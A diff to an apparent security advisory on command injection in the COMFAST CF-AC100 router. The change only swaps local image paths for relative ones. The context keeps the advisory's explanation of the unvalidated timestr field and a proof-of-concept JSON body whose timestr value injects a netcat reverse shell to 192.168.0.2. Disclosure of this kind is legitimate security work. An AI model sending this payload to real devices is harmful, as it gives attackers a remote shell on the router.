@@ -14,11 +14,11 @@ A command injection vulnerability has been discovered in COMFAST CF-AC100 V2.6.0
 
 ### 漏洞详情
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)
+![](../main/images/2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)
 
 The trigger point is located in the `sub_41DBC0` method of the `webmggnt` component. Here, the `timestr` field is not validated and is concatenated using `sprintf`, and then executed using `system`.
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-31-38-da39653a-f654-4732-abbf-16b689687634.png)
+![](../main/images/2026-02-23-17-31-38-da39653a-f654-4732-abbf-16b689687634.png)
 
 ### 概念验证
 
@@ -40,4 +40,5 @@ Cookie: language=sc; COMFAST_SESSIONID=0200a8c0-4261ffffffc85cffffff8a5f-6b8b456
 {"timestr":"2021-10-10 10:10:10\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 9999 >/tmp/f; #","timezone":"UTC-8","zonename":"63","ntp_client_enabled":"0","ntp_servername":"0.openwrt.pool.ntp.org"}
 ```
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-32-47-bd19518f-7a25-4f31-9b8c-c48987e9a24e.png)
+![](../main/images/2026-02-23-17-32-47-bd19518f-7a25-4f31-9b8c-c48987e9a24e.png)
+
